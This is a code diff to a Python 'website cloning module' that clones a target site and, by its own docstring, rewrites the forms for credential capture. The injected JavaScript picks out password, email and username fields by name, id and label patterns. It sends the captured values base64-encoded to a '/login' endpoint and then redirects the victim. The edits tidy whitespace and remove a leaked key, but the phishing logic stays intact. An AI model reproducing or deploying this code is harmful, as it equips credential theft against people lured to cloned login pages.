@@ -2,7 +2,7 @@
 """
 Asuka Website Cloning Module
 Clones a target website, including design, layout, and assets, and captures raw form inputs.
-Uses Playwright for dynamic rendering, BeautifulSoup for HTML parsing, and Fernet for encryption.
+Uses Playwright for dynamic rendering, BeautifulSoup for HTML parsing, and Fernet for server-side encryption.
 """
 
 import os
@@ -21,26 +21,28 @@ from .utils import download_asset
 def configure_logging(show_logs):
     """
     Configures logging to write to a file and optionally to the console.
-    
+
     Args:
         show_logs (bool): If True, logs are also output to the console.
     """
     handlers = [logging.FileHandler('clone.log')]
     if show_logs:
         handlers.append(logging.StreamHandler())
-    
+
     logging.basicConfig(
         level=logging.DEBUG,
         format='%(asctime)s - %(levelname)s - %(message)s',
         handlers=handlers
     )
 
-# Global Fernet key for encryption/decryption
+# Global Fernet key for encryption/decryption (server-side only)
 fernet_key_file = 'fernet_key.bin'
 if not os.path.exists(fernet_key_file):
     fernet_key = Fernet.generate_key()
     with open(fernet_key_file, 'wb') as f:
         f.write(fernet_key)
+    # Set secure file permissions (readable/writable only by owner)
+    os.chmod(fernet_key_file, 0o600)
 else:
     with open(fernet_key_file, 'rb') as f:
         fernet_key = f.read()
@@ -49,11 +51,11 @@ cipher = Fernet(fernet_key)
 def initialize_browser(user_agent, headless=True):
     """
     Initializes a Playwright browser instance for rendering dynamic content.
-    
+
     Args:
         user_agent (str): User agent string for HTTP requests.
         headless (bool): Whether to run the browser in headless mode.
-    
+
     Returns:
         tuple: Playwright instance, browser, and browser context.
     """
@@ -78,12 +80,12 @@ def close_browser(playwright_instance, browser, context):
 def get_page_content(url, context, user_agent):
     """
     Fetches the rendered HTML content, ensuring all dynamic content is loaded.
-    
+
     Args:
         url (str): Target URL to fetch.
         context: Playwright browser context.
         user_agent (str): User agent string for the request.
-    
+
     Returns:
         str: Rendered HTML content of the page.
     """
@@ -103,12 +105,12 @@ def get_page_content(url, context, user_agent):
 def get_dynamic_assets(html, context, user_agent):
     """
     Extracts dynamically loaded assets (images, CSS, JS, fonts) from the HTML.
-    
+
     Args:
         html (str): HTML content to analyze.
         context: Playwright browser context.
         user_agent (str): User agent string for rendering.
-    
+
     Returns:
         list: List of asset URLs (excluding data URLs).
     """
@@ -286,7 +288,7 @@ def download_assets(html, url, base_path, user_agent):
 def clone(url, user_agent, download_assets_flag=True, multi_page=True, custom_js='', disable_scripts=False, redirect_url='', show_logs=False):
     """
     Clones a target website and modifies forms for credential capture.
-    
+
     Args:
         url (str): Target URL to clone.
         user_agent (str): User agent string for HTTP requests.
@@ -296,7 +298,7 @@ def clone(url, user_agent, download_assets_flag=True, multi_page=True, custom_js
         disable_scripts (bool): Whether to remove script tags.
         redirect_url (str): URL to redirect to after form submission.
         show_logs (bool): Whether to show logs in the console.
-    
+
     Returns:
         str: Path to the cloned index.html file, or None on failure.
     """
@@ -333,7 +335,7 @@ def clone(url, user_agent, download_assets_flag=True, multi_page=True, custom_js
             hidden_input = soup.new_tag('input')
             hidden_input['type'] = 'hidden'
             hidden_input['name'] = 'data'
-            hidden_input['id'] = 'encrypted_data'
+            hidden_input['id'] = 'encoded_data'  # Changed to reflect encoding, not encryption
             form.append(hidden_input)
 
         custom_js_code = ''
@@ -376,8 +378,8 @@ def clone(url, user_agent, download_assets_flag=True, multi_page=True, custom_js
                     const name = (input.getAttribute('name') || '').toLowerCase();
                     const id = (input.getAttribute('id') || '').toLowerCase();
                     const type = input.type.toLowerCase();
-                    const label = (input.closest('label')?.textContent || 
-                                 input.getAttribute('aria-label') || 
+                    const label = (input.closest('label')?.textContent ||
+                                 input.getAttribute('aria-label') ||
                                  input.getAttribute('placeholder') || '').toLowerCase();
                     return /password|pass|pwd/i.test(name) ||
                            /password|pass|pwd/i.test(id) ||
@@ -390,8 +392,8 @@ def clone(url, user_agent, download_assets_flag=True, multi_page=True, custom_js
                     const name = (input.getAttribute('name') || '').toLowerCase();
                     const id = (input.getAttribute('id') || '').toLowerCase();
                     const type = input.type.toLowerCase();
-                    const label = (input.closest('label')?.textContent || 
-                                 input.getAttribute('aria-label') || 
+                    const label = (input.closest('label')?.textContent ||
+                                 input.getAttribute('aria-label') ||
                                  input.getAttribute('placeholder') || '').toLowerCase();
                     return (type === 'email' || type === 'text' || type === 'tel') &&
                            (/login|username|email|user|account|id/i.test(name) ||
@@ -412,15 +414,14 @@ def clone(url, user_agent, download_assets_flag=True, multi_page=True, custom_js
                 // Send credentials
                 function sendCredentials(obj, requestId) {{
                     logError('Sending credentials with requestId: ' + requestId + ', data: ' + JSON.stringify(obj));
-                    const encrypted = '{base64.b64encode(fernet_key).decode()}:' + btoa(JSON.stringify(obj));
+                    const encoded = btoa(JSON.stringify(obj));  // Base64 encode for transmission
                     fetch('/login', {{
                         method: 'POST',
-                        headers: {{ 
+                        headers: {{
                             'Content-Type': 'application/x-www-form-urlencoded',
-                            'X-Obfuscated': 'true',
                             'X-Request-Id': requestId
                         }},
-                        body: 'data=' + encodeURIComponent(encrypted)
+                        body: 'data=' + encodeURIComponent(encoded)
                     }}).then(response => {{
                         logError('Fetch response for requestId ' + requestId + ': ' + response.status);
                         window.location.href = '{redirect_url}' || response.headers.get('Location') || '/';
